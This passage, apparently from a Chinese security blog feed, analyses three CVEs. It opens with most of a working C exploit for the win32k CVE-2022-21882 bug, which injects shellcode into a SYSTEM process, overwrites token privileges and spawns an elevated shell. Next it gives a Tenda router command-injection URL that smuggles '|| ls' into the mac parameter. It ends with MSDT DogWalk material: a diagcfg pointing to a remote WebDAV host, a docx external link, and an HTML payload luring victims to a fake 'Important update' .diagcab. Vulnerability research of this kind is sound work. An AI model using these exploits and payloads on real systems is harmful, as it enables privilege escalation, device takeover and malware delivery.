    if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
    {
        printf("[Error_%d] WriteProcessMemory failed !\n", __LINE__);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

    printf("[+] Writing in system process succeded\n");

    if (hThread == NULL) {
        printf("[Error_%d] CreateRemoteThread failed !\n", __LINE__);
        return;
    }
    else
        printf("[+] Remote thread created !\n");
    CloseHandle(hSystemProcess);
}

ULONG64 GetToken() {
    PSYSTEM_HANDLE_INFORMATION_EX sys_handle_info_ref = NULL;
    ULONG64 Token = 0;
    ULONG len = 20;
    NTSTATUS ntst = 0;

    OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &amp;gb::hToken);
    if (gb::hToken == INVALID_HANDLE_VALUE) {
        printf("[Error_%d] GetToken(): OpenProcessToken failed.\n", __LINE__);
        return 0;
    }
    //获取本进程的EPROCESS
    do {
        len *= 2;
        sys_handle_info_ref = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(sys_handle_info_ref, len);
        ntst = gb::ZwQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, sys_handle_info_ref, len, &amp;len);
    } while (ntst == STATUS_INFO_LENGTH_MISMATCH);

    if (ntst != 0) {
        printf("[Error_%d] GetToken(): ZwQuerySystemInformation failed.\n", __LINE__);
        if (sys_handle_info_ref)
            free(sys_handle_info_ref);
        return 0;
    }

    DWORD pid = GetCurrentProcessId();
    for (int i = 0; i &lt; sys_handle_info_ref-&gt;HandleCount; i++) {
        if (gb::hToken == sys_handle_info_ref-&gt;Handles[i].HandleValue
            &amp;&amp; (HANDLE)pid == sys_handle_info_ref-&gt;Handles[i].UniqueProcessId) {
            Token = (ULONG64)sys_handle_info_ref-&gt;Handles[i].Object;
            break;
        }
    }

    if (sys_handle_info_ref)
        free(sys_handle_info_ref);

    printf("[+] Found current process token = %p\n", Token);
    return Token;
}


BOOLEAN Init() {
    BOOLEAN bRet = TRUE;
    int offset = 0;
    DWORD64 next_code = 0;

    __try {
        gb::g_hUser32 = LoadLibraryA("user32.dll");
        if (!gb::g_hUser32) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }
        //获取u32_IsMenu
        gb::u32_IsMenu = (IsMenu_t)GetProcAddress(gb::g_hUser32, "IsMenu");
        if (!gb::u32_IsMenu) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }

        for (int i = 0; i &lt; 0x100; i++) {
            PUCHAR tr = (PUCHAR)gb::u32_IsMenu + i;
            if (*tr == 0xE8)
            {//找到调用HMValidateHandle的指令位置
                offset = *(int*)((PCHAR)gb::u32_IsMenu + i + 1);
                next_code = (DWORD64)gb::u32_IsMenu + i + 5;
                gb::HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
                break;
            }
        }
        if (!gb::HMValidateHandle) {
            printf("[!] Error: Can not find HMValidateHandle!\n");
            bRet = FALSE;
            __leave;
        }

        printf("[+] Found HMValidateHandle = 0x%p\n", gb::HMValidateHandle);

        gb::g_hNtdll = LoadLibraryA("ntdll.dll");
        if (!gb::g_hNtdll) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }

        gb::g_hWin32u = LoadLibraryA("win32u.dll");
        if (!gb::g_hWin32u) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }
        
        gb::NtCallbackReturn = (NtCallbackReturn_t)GetProcAddress(gb::g_hNtdll, "NtCallbackReturn");
        gb::NtUserMessageCall = (NtUserMessageCall_t)GetProcAddress(gb::g_hWin32u, "NtUserMessageCall");
        gb::NtUserConsoleControl = (NtUserConsoleControl_t)GetProcAddress(gb::g_hWin32u, "NtUserConsoleControl");
        gb::ZwQuerySystemInformation = (ZwQuerySystemInformation_t)GetProcAddress(gb::g_hNtdll, "NtQuerySystemInformation");
        gb::RtlAllocateHeap = (RtlAllocateHeap_t)GetProcAddress(gb::g_hNtdll, "RtlAllocateHeap");
        if (gb::NtCallbackReturn==0 || gb::NtUserMessageCall==0 || 
            gb::NtUserConsoleControl==0 || gb::ZwQuerySystemInformation==0 ||
            gb::RtlAllocateHeap==0) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }
    }
    __finally {

    }
    return bRet;
}

int main(int argc,char *argv[]) {

    if (argc &lt;= 1) {
        printf(
        "Usage:\n"
        "         Example: CVE-2022-21882.exe whoami\n"
        );
        return 0;
    }

    WNDCLASSEXW WndClassExW = { 0 };

    ULONG64 TokenAddr = 0;

    if (Init()) {

        TokenAddr = GetToken();

        if (TokenAddr == 0) {
            printf("[-] Error(%u): GetToken failed.\n");
            return 0;
        }

        WndClassExW.hIcon = 0;
        WndClassExW.hbrBackground = 0;
        WndClassExW.lpszClassName = 0;
        WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
        WndClassExW.cbSize = sizeof(WNDCLASSEXW);
        WndClassExW.style = CS_VREDRAW | CS_HREDRAW;;
        WndClassExW.cbClsExtra = 0;
        WndClassExW.cbWndExtra = 0x60;
        WndClassExW.hInstance = GetModuleHandleW(0);
        WndClassExW.lpszClassName = L"VictimClass";
        //被覆盖写
        ATOM atom_vic = RegisterClassExW(&amp;WndClassExW);

        WndClassExW.cbWndExtra = TRIGGERWND_EXTRASIZE;
        WndClassExW.lpszClassName = L"TriggerClass";

        //触发漏洞
        ATOM atom_trig = RegisterClassExW(&amp;WndClassExW);

        gb::g_hVictimWnd = CreateWindowExW(NULL,
            (LPCWSTR)(unsigned __int16)atom_vic,
            L"VictimWnd",
            NULL,
            0,
            0, 
            0,
            0,
            0,
            0,
            GetModuleHandleW(0),
            0);
        printf("[+] Created victim windows = 0x%p\n", gb::g_hVictimWnd);

        gb::g_hTriggerWnd = CreateWindowExW(NULL,
            (LPCWSTR)(unsigned __int16)atom_trig,
            L"TriggerBug",
            NULL,
            0,
            0,
            0,
            0,
            0,
            0,
            GetModuleHandleW(0),
            0);
        printf("[+] Created trigger windows = 0x%p\n", gb::g_hTriggerWnd);
        // 触发漏洞
        // 获取刚创建的这两个窗口的桌面堆
        PWND Trigger= gb::HMValidateHandle(gb::g_hTriggerWnd, 1);
        gb::TriggerDeskHeap = Trigger-&gt;OffsetToDesktopHeap;
        printf("[+] TriggerDeskHeap's tagWND = 0x%p\n", Trigger);
        PWND Victim = gb::HMValidateHandle(gb::g_hVictimWnd, 1);
        gb::VictimDeskHeap = Victim-&gt;OffsetToDesktopHeap;
        DWORD64 Distance = 0;
        if (gb::VictimDeskHeap&gt; gb::TriggerDeskHeap) {
            Distance=gb::VictimDeskHeap - gb::TriggerDeskHeap;
        }
        else {
            Distance = gb::TriggerDeskHeap - gb::VictimDeskHeap;
        }

        if (Distance &gt;= TRIGGERWND_EXTRASIZE) {
            printf("[-] Heap spray failed!\n");
            return 0;
        }

        printf("[+] VictimDeskHeap's tagWND = 0x%p\n", Victim);
        printf("[+] TriggerDeskHeap = %p\n", gb::TriggerDeskHeap);
        printf("[+] VictimDeskHeap = %p\n", gb::VictimDeskHeap);

        // 回调函数
        SetFuncHook((DWORD64)ClientAllocatWindowClassExtraBytesProxy,(DWORD64)ClientFreeWindowsClassExtraBytesProxy);
        // 触发漏洞
        gb::NtUserMessageCall(gb::g_hTriggerWnd, WM_CREATE,0,0, NULL, 0, FALSE);

        // 修改 tagWND_victim-&gt;ExtraBytes = TokenAddr
        ULONG_PTR Old = SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128+0x10, TokenAddr+0x40);
        // 修改 Token-&gt;Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
        SetWindowLongPtrW(gb::g_hVictimWnd, 8, 0xFFFFFFFFFFFFFFFF);
        // 修改 Token-&gt;Privileges.Present = 0xFFFFFFFFFFFFFFFF
        SetWindowLongPtrW(gb::g_hVictimWnd, 0, 0xFFFFFFFFFFFFFFFF);

        if (CheckPrivilege(gb::hToken)) {
            SpawnShell();
        }
        else {
            printf("[+] 提权失败！\n");
        } 

        // 恢复 tagWND_Victim-&gt;ExtraBytes = Old
        SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128 + 0x10, Old);
        // 恢复 tagWND_Trigger-&gt;Styles &amp;= ~0x800
        SetWindowLongPtrW(gb::g_hTriggerWnd, Distance + 0xE8 + 0x10, Trigger-&gt;dwExStyle);
        system("pause");
    }
    return 0;
    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>1.触发越界写入漏洞，修改window对象的cbWndExtra为0xFFFEFFF，使用window对象WndExtra可以访问大内存。</p>
<p>2.修改另一个窗口的WS_CHILD标志，为另一个窗口设置一个专门构造的Menu(fake menu)</p>
<p>3.通过GetMenuBarInfo API和假菜单获取任意读取原语。</p>
<p>4.使用SetWindowLongPtrA API修改另一个窗口对象的ExtraBytes以获得任意写入原语。</p>
<p>5.通过EPROCESS ActiveProcessLinks找到PID为4的系统eprocess</p>
<p>6.读取系统token，替换当前进程token</p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173152485.png"></p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173215705.png"></p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173238270.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-37810 Tenda路由器命令注入分析</title>
    <url>/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Tenda AC1206(v15.03.06.23)存在formWriteFacMac命令注入漏洞，可以通过mac参数执行任意命令。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>US_AC1206V1.0RTL_V15.03.06.23_multi_TD01</p>
<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="qemu执行"><a href="#qemu执行" class="headerlink" title="qemu执行"></a>qemu执行</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103057802.png"></p>
<p>mips小端</p>
<pre class="line-numbers language-none"><code class="language-none">cd _US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin.extracted/squashfs-root/
cp $(which qemu-mipsel-static) ./
sudo ./qemu-mipsel-static -L ./ ./bin/httpd
sudo chroot ./ ./qemu-mipsel-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103628491.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121104528268.png"></p>
<p>main函数中0x00433a68有对apmib_init的判断，patch掉，bnez改为beqz</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121111549227.png"></p>
<p>ConnectCfm也需要改掉</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121112030522.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161405750.png"></p>
<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
sudo brctl addif br0 eth0
sudo ifconfig br0 up
sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161943583.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162340458.png"></p>
<h4 id="formWriteFacMac"><a href="#formWriteFacMac" class="headerlink" title="formWriteFacMac"></a>formWriteFacMac</h4><p>漏洞点在http的formWriteFacMac函数，IDA定位关键函数fromWirteFacMac，控制了mac参数就能利用doSystemCmd实现命令注入。</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162811780.png"></p>
<h4 id="doSystemCmd"><a href="#doSystemCmd" class="headerlink" title="doSystemCmd"></a>doSystemCmd</h4><p>doSystemCmd函数不在httpd中，在libcommon.so中</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121164709994.png"></p>
<p>交叉引用查看formWriteFacMac函数调用链</p>
<pre class="line-numbers language-none"><code class="language-none">main -&gt; initWebs -&gt; formDefineTenDa -&gt; websFormDefine('WriteFacMac',formWriteFacMac);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>formDefineTenDa包含路由器接口和对应的处理函数，通过websFormDefine注册后，WriteFacMac会和formWriteFacMac形成绑定，在goform下产生接口WriteFacMac调用formWriteFacMac</p>
<p>192.168.130.137/goform/WriteFacMac</p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121174942212.png"></p>
<h4 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121170833769.png"></p>
<h4 id="formDefineTenDa"><a href="#formDefineTenDa" class="headerlink" title="formDefineTenDa"></a>formDefineTenDa</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121165748345.png"></p>
<h4 id="websGetVar"><a href="#websGetVar" class="headerlink" title="websGetVar"></a>websGetVar</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172710514.png"></p>
<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172721758.png"></p>
<p>判断wp中的mac参数是否存在，不存在返回默认值00:01:02:11:22:33，存在则返回对应值，没有做任何过滤，因此可以直接构造。</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>当wp判断mac参数是否存在时，返回值没有做任何过滤，因此可以直接构造。</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.130.137/goform/WriteFacMac?mac=00:01:02:11:22:33 || ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121175540394.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-34713 MSDT目录遍历漏洞分析</title>
    <url>/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞。存在路径穿越的脆弱性，攻击者可以遍历目录，将恶意可执行程序放置Window启动文件夹。<br>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">Windows 11
Server 2022
Server, version 20H2
Server 2019
Windows 10
Server 2016
Server 2012 R2
Server 2012
Windows 8.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞，位于%WINDIR%\System32\msdt.exe,与以下文件类型相关联</p>
<table>
<thead>
<tr>
<th><strong>File type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>.diagcab</td>
<td>Diagnostic cabinet file</td>
</tr>
<tr>
<td>.diagpkg</td>
<td>Diagnostic package file</td>
</tr>
<tr>
<td>.diagcfg</td>
<td>Diagnostic configuration file</td>
</tr>
</tbody></table>
<p>关注其中的diagcab文件。解开后拿到Custom.diagcfg:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008"&gt;
  &lt;Execution&gt;
    &lt;Package Path="\\webdav-test.herokuapp.com@ssl\DavWWWRoot\package" /&gt;
    &lt;Name&gt;Some name&lt;/Name&gt;
    &lt;Description&gt;Some description&lt;/Description&gt;
    &lt;Icon&gt;@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001&lt;/Icon&gt;
  &lt;/Execution&gt;

  &lt;Index&gt;
    &lt;Id&gt;Custom&lt;/Id&gt;
    &lt;RequiresAdminPrivileges&gt;false&lt;/RequiresAdminPrivileges&gt;
    &lt;PrivacyUrl&gt;http://go.microsoft.com/fwlink/?LinkId=190175&lt;/PrivacyUrl&gt;
    &lt;Version&gt;1.0&lt;/Version&gt;
    &lt;PublisherName&gt;Microsoft Corporation&lt;/PublisherName&gt;
    &lt;Category&gt;@%windir%\system32\DiagCpl.dll,-412&lt;/Category&gt;
    &lt;Keyword&gt;@%windir%\system32\DiagCpl.dll,-27&lt;/Keyword&gt;
  &lt;/Index&gt;
&lt;/PackageConfiguration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>&lt;Execution&gt;</code>标签下说明了该诊断包的执行行为, msdt会访问<code>&lt;Package Path&gt;</code>给出的路径。</p>
<p>漏洞位于<code>sdiageng.dll</code>中，该库从diagcab的XML文件中获取攻击者提供的文件夹路径，当包获取完成后, msdt将对其进行签名检查, 它将包的副本复制到<code>%TEMP%\SDIAG_&lt;UUID&gt;</code>的临时目录, 调用函数<code>sdiageng!SdpCopyDirectory</code>。在此过程中枚举攻击者文件夹中的文件，获取每个文件的文件名，然后将本地临时文件路径和该文件名拼接用来创建文件在计算机上的本地路径。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>设置一个托管恶意.diagcab文件的webdav服务器，当访问.diagcab文件的链接或者下载时，会将执行路径穿越，把可执行程序写入C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup,每次启动自动执行。</p>
<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>1、创建webdav服务器</p>
<p>实现运行webdav服务的脚本或程序, 部署在服务端。注册并部署客户端访问的package路径。</p>
<p>2、构造<code>diagcfg</code>文件</p>
<p>测试用的<code>diagcfg</code>中的package:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;Package Path="\\127.0.0.1\DavWWWRoot\package" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3、构造辅助利用文件: <code>diagcab</code>或<code>docx</code>文档</p>
<p>4、投递用户, 打开构造后的文件</p>
<p> 注: 目标环境需要开启webclient服务, 否则无法访问webdav的UNC路径。</p>
<h4 id="利用的文件类型-diagcab"><a href="#利用的文件类型-diagcab" class="headerlink" title="利用的文件类型: diagcab"></a>利用的文件类型: <code>diagcab</code></h4><p>将<code>diagcfg</code>打包为<code>diagcab</code>, 双击打开后漏洞利用完成:</p>
<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155250555.png"></p>
<p>该漏洞只能做到载荷投放, 需要通过其他方式才可运行。</p>
<p>使用docker</p>
<p>1.构建Custom.diagcfg</p>
<pre class="line-numbers language-none"><code class="language-none">./build-malicious-diagcfg.sh --url [WEBDAV_URL]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.构建hotfix895214.diagcab,移至./webdav/diagcab-webdav-poc/config目录,将可执行文件放入./webdav/malicious</p>
<pre class="line-numbers language-none"><code class="language-none">cabarc.exe n hotfix895214.diagcab Custom.diagcfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3.启动服务</p>
<pre class="line-numbers language-none"><code class="language-none">cd ./webdav/diagcab-webdav-poc
perl diagcab-webdav-poc.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>或者直接使用docker直接执行<code>./hurry-dogwalk.sh [WEBDAV_URL]</code></p>
<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155349317.png"></p>
<h4 id="利用的文件类型-docx"><a href="#利用的文件类型-docx" class="headerlink" title="利用的文件类型: docx"></a>利用的文件类型: docx</h4><p>解开.docx样本文件，关注其中/word/_rels目录下的document.xml.rels文件。会对外部文件进行引用执行。</p>
<pre class="line-numbers language-none"><code class="language-none">Target="https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html!x-usc:https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html" TargetMode = "External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>payload.html</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;body&gt;
&lt;script&gt;
...
window.location.href = "search-ms:query=i-repair-everything-on-your-computer.diagcab&amp;crumb=location:%5C%5Cwebdav-test.herokuapp.com%40SSL%5CDavWWWRoot%5Cconfig&amp;displayname=Important%20update"
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行payload访问webdav</p>
